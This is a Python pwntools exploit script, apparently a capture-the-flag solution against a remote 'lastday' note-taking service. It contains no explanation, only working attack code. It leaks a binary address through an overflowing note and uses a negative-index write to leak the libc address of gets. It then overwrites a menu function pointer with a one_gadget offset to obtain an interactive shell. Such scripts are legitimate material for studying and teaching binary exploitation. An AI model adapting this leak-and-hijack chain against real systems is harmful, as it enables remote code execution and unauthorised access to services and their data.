from pwn import *

context.log_level = 'INFO'

bin_file = './lastday'
r = remote('lox.xvm.mit.edu', 11218)
# r = process(bin_file)
# context.log_level = 'DEBUG'
# gdb.attach(r, """
# c
# """)
notesize = 16


def take_note(day, index, text):
    r.recvuntil('2) read note\n')
    r.sendline('1')
    r.recvuntil('day #\n')
    r.sendline(chr(day+ord('0')))
    r.recvuntil('note #\n')
    r.sendline(chr(index+ord('0')))
    r.recvuntil('contents\n')
    r.sendline(text)


def read_note(day, index):
    r.recvuntil('2) read note\n')
    r.sendline('2')
    r.recvuntil('day #\n')
    r.sendline(chr(day+ord('0')))
    r.recvuntil('note #\n')
    r.sendline(chr(index+ord('0')))
    return r.recvuntil('MENU:\n')


take_note(1, 4, 'A'*(notesize+2))
leak = read_note(1, 4)[:-1 * len('\nMENU:\n')][-6:]
leak = u64(leak.ljust(8, '\x00'))
log.info('leak addr: {:#x}'.format(leak))
day0_offset = 0x0000000000202020
imagebase = leak - day0_offset
log.info('imagebase: {:#x}'.format(imagebase))

# elf = ELF(bin_file)
# libc = elf.libc
libc = ELF('libc.so.6')

got_gets_offset = 0x0000000000201FC8
take_note(4, -3, p64(imagebase + got_gets_offset - 0x18)) # offsetof(struct day, notes[0])

gets = read_note(2, 0)[:-1 * len('\nMENU:\n')][-6:]
gets = u64(gets.ljust(8, '\x00'))
log.info('leaked gets addr: {:#x}'.format(gets))
libc_base = gets - libc.symbols.gets
log.info('libc base: {:#x}'.format((libc_base)))

menu_add_day_offset = 0x00000000002022B0
one_gadget = 0xf0567
take_note(4, -3, p64(imagebase + menu_add_day_offset - 0x18)) # offsetof(struct day, notes[0])
take_note(2, 0, p64(libc_base + one_gadget))
log.info('menu add_day addr: {:#x}'.format(imagebase + menu_add_day_offset))

r.recv()
r.sendline('3')

r.interactive()
